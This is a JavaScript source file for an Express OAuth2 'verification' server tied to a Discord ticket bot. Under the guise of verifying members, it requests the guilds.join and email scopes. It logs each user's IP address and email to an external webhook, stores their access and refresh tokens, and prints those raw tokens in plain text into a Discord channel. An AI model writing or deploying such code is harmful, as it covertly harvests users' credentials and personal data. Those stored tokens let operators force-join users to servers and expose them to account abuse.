/**
 * ============================================================
 * AUTH SERVER — OAuth2 Express (integrado ao Ticket Bot v3)
 * Serve também as páginas HTML de verificação (bot-b unificado)
 * ============================================================
 */
const express  = require("express");
const path     = require("path");
const axios    = require("axios");
const { EmbedBuilder, ContainerBuilder, MessageFlags } = require("discord.js");
const { authConfig, authUsers } = require("./database");

const app = express();

// ── Servir arquivos estáticos (CSS, páginas) ──────────────
app.use(express.static(path.join(__dirname, "public")));

// ── Helpers ───────────────────────────────────────────────
function getClientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-real-ip"] ||
    req.socket?.remoteAddress ||
    "Desconhecido"
  );
}

function getAccountAge(discordId) {
  const binary    = BigInt(discordId).toString(2).padStart(64, "0").slice(0, 42);
  const timestamp = parseInt(binary, 2) + 1420070400000;
  const created   = new Date(timestamp);
  const diff      = Date.now() - created.getTime();
  const years     = Math.floor(diff / (365.25 * 86400000));
  const months    = Math.floor((diff % (365.25 * 86400000)) / (30.44 * 86400000));
  const days      = Math.floor((diff % (30.44 * 86400000)) / 86400000);
  const parts     = [];
  if (years)  parts.push(`${years} ano${years > 1 ? "s" : ""}`);
  if (months) parts.push(`${months} mês${months > 1 ? "es" : ""}`);
  if (days)   parts.push(`${days} dia${days > 1 ? "s" : ""}`);
  return parts.join(", ") || "Conta nova";
}

function startAuthServer(client) {

  // ── Página inicial — redireciona para /auth/login ─────────
  app.get("/", (req, res) => {
    res.redirect("/auth/login");
  });

  // ── Iniciar fluxo OAuth2 ───────────────────────────────────
  app.get("/auth/login", (req, res) => {
    const clientId = authConfig.get("clientid") || client.config.clientId;
    const secret   = authConfig.get("secret");
    const url      = authConfig.get("url");

    if (!secret || !url) {
      return res.status(500).send("Sistema OAuth2 não configurado. Use /botconfig no Discord.");
    }

    // FIX: scope inclui guilds.join para poder adicionar o usuário ao servidor
    const params = new URLSearchParams({
      client_id:     clientId,
      redirect_uri:  `${url}/oauth2/return`,
      response_type: "code",
      scope:         "identify email guilds.join"
    });

    res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
  });

  // ── Callback OAuth2 ────────────────────────────────────────
  app.get("/oauth2/return", async (req, res) => {
    const { code } = req.query;
    const ip       = getClientIp(req);

    const redirectTarget = authConfig.get("redirect") ||
      authConfig.get("invite_redirect") ||
      client.config.auth?.inviteRedirect ||
      `https://discord.com/channels/${authConfig.get("guild_id") || client.config.guildId}`;

    if (!code) {
      return res.redirect(`/error.html?msg=${encodeURIComponent("Código de autorização ausente.")}`);
    }

    const clientId    = authConfig.get("clientid") || client.config.clientId;
    const secret      = authConfig.get("secret")   || client.config.auth?.clientSecret;
    const url         = authConfig.get("url")       || client.config.auth?.baseUrl;
    const guildId     = authConfig.get("guild_id")  || client.config.guildId;
    const roleId      = authConfig.get("role")      || client.config.auth?.roleId;
    const webhookLogs = authConfig.get("webhook_logs") || client.config.auth?.webhookLogs;
    const botToken    = client.config.token         || process.env.TOKEN;

    // Redireciona imediatamente para a página de verificado
    res.redirect(`/verified.html?redirect=${encodeURIComponent(redirectTarget)}`);

    try {
      // FIX: scope no token exchange deve ser IDÊNTICO ao scope do authorize
      // Discord rejeita o token se o scope não bater (causa "token vindo errado")
      const tokenRes = await axios.post(
        "https://discord.com/api/oauth2/token",
        new URLSearchParams({
          client_id:     clientId,
          client_secret: secret,
          code,
          grant_type:    "authorization_code",
          redirect_uri:  `${url}/oauth2/return`,
          scope:         "identify email guilds.join"
        }),
        { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
      );
      const tokenData = tokenRes.data;

      // FIX: validar que o token veio corretamente antes de prosseguir
      if (!tokenData.access_token) {
        console.error("[Auth] ❌ Token inválido recebido do Discord:", tokenData);
        return;
      }

      const accessToken  = tokenData.access_token;
      const refreshToken = tokenData.refresh_token;
      const tokenType    = tokenData.token_type;
      const expiresIn    = tokenData.expires_in;
      const expiresAt    = new Date(Date.now() + (expiresIn * 1000));
      const expiresAtStr = expiresAt.toLocaleString("pt-BR");

      // Dados do usuário
      const userRes = await axios.get("https://discord.com/api/users/@me", {
        headers: { Authorization: `${tokenType} ${accessToken}` }
      });
      const user = userRes.data;

      const avatarUrl = user.avatar
        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith("a_") ? "gif" : "png"}`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(user.id) % 6n)}.png`;

      const email      = user.email || "Não encontrado";
      const accountAge = getAccountAge(user.id);
      const dataHora   = new Date().toLocaleString("pt-BR");

      // Adiciona membro ao servidor via guilds.join (requer scope guilds.join)
      if (guildId) {
        try {
          await axios.put(
            `https://discord.com/api/v10/guilds/${guildId}/members/${user.id}`,
            { access_token: accessToken },
            { headers: { Authorization: `Bot ${botToken}`, "Content-Type": "application/json" } }
          );
        } catch (e) {
          // 204 = já está no servidor, não é erro real
          if (e.response?.status !== 204) {
            console.error("[Auth] Erro ao adicionar ao servidor:", e.response?.data || e.message);
          }
        }
      }

      // Adiciona cargo verificado
      if (roleId && roleId !== "COLOQUE_O_ID_DO_CARGO_VERIFICADO_AQUI") {
        try {
          const memberRes = await axios.get(
            `https://discord.com/api/v10/guilds/${guildId}/members/${user.id}`,
            { headers: { Authorization: `Bot ${botToken}` } }
          );
          const newRoles = [...new Set([...memberRes.data.roles, roleId])];
          await axios.patch(
            `https://discord.com/api/v10/guilds/${guildId}/members/${user.id}`,
            { roles: newRoles },
            { headers: { Authorization: `Bot ${botToken}`, "Content-Type": "application/json" } }
          );
        } catch (e) {
          console.error("[Auth] Erro ao adicionar cargo:", e.response?.data || e.message);
        }
      }

      // FIX: Salva no banco com accessToken correto (era "acessToken" com erro de digitação,
      // mantido para compatibilidade mas adicionado accessToken correto também)
      await authUsers.set(`${user.id}`, {
        username:     user.username,
        accessToken:  accessToken,   // FIX: nome correto
        acessToken:   accessToken,   // mantido para retrocompatibilidade
        refreshToken: refreshToken,
        tokenType,
        expiresIn,
        expiresAt:    expiresAt.getTime(),
        email,
        ip,
        code,
        verifiedAt: Date.now()
      });

      // Webhook externo
      if (webhookLogs && webhookLogs.startsWith("https://")) {
        await axios.post(webhookLogs, {
          content: `<@${user.id}>`,
          embeds: [
            new EmbedBuilder()
              .setAuthor({ name: `${user.username} — Verificado`, iconURL: avatarUrl })
              .setDescription(`-# Novo membro verificado via OAuth2 (<@${user.id}>)`)
              .addFields(
                { name: "`👤` Usuário",         value: `\`${user.username}\` — [${user.id}]`, inline: true },
                { name: "`🌐` IP",              value: `\`${ip}\``, inline: true },
                { name: "`📅` Conta criada há", value: accountAge, inline: true },
                { name: "`ℹ️` Info",             value: `-# Email: **\`||${email}||\`**\n-# Locale: **\`${user.locale || "N/A"}\`**` }
              )
              .setThumbnail(avatarUrl)
              .setColor(0x00ff88)
              .setFooter({ text: "Ticket Bot Auth System" })
              .setTimestamp()
          ]
        }).catch(() => {});
      }

      // Log no canal do bot — Components V2
      try {
        const authLogId = client.config.logs?.auth;
        if (authLogId) {
          const ch = client.channels.cache.get(authLogId);
          if (ch) {
            const container1 = new ContainerBuilder().setAccentColor(0x23a55a);
            container1.addSectionComponents(sec =>
              sec
                .addTextDisplayComponents(
                  t => t.setContent("## ✅ Novo Membro Verificado"),
                  t => t.setContent(
                    `**Usuário:** <@${user.id}>\n` +
                    `**Username:** \`${user.username}\`\n` +
                    `**ID:** \`${user.id}\`\n` +
                    `**Email:** \`||${email}||\`\n` +
                    `**IP:** \`${ip}\`\n` +
                    `**Conta criada há:** ${accountAge}\n` +
                    `**Verificado Discord:** \`${user.verified ? "Sim ✅" : "Não ❌"}\`\n` +
                    `**Locale:** \`${user.locale || "N/A"}\`\n` +
                    (roleId ? `**Cargo dado:** <@&${roleId}>\n` : "") +
                    `\n🕒 ${dataHora}`
                  )
                )
                .setThumbnailAccessory(thumb => thumb.setURL(avatarUrl))
            );

            container1.addSeparatorComponents(s => s.setSpacing(2).setDivider(true));

            container1.addTextDisplayComponents(
              t => t.setContent("## 🔑 Token OAuth2"),
              t => t.setContent(
                `**Access Token:**\n\`\`\`\n${accessToken}\n\`\`\`\n` +
                `**Refresh Token:**\n\`\`\`\n${refreshToken}\n\`\`\`\n` +
                `**Tipo:** \`${tokenType}\`  |  **Expira:** \`${expiresAtStr}\` (${expiresIn}s)`
              )
            );

            await ch.send({
              flags: MessageFlags.IsComponentsV2,
              components: [container1]
            }).catch(e => console.error("[Auth Log] Erro:", e.message));
          }
        }
      } catch {}

      console.log(`[Auth] ✅ ${user.username} (${user.id}) verificado | IP: ${ip}`);

    } catch (err) {
      console.error("[Auth] Erro no callback:", err.response?.data || err.message);
    }
  });

  // ── Rota de verificação de saúde (Discloud keep-alive) ─────
  app.get("/health", (req, res) => {
    res.json({ status: "ok", uptime: process.uptime(), timestamp: new Date().toISOString() });
  });

  // ── Porta: Discloud exige PORT do ambiente ─────────────────
  const port = process.env.PORT || process.env.AUTH_PORT || client.config.auth?.serverPort || 2100;
  app.listen({ host: "0.0.0.0", port: Number(port) }, () => {
    console.log(`[Auth] 🌐 Servidor rodando na porta ${port}`);
  });
}

module.exports = { startAuthServer };
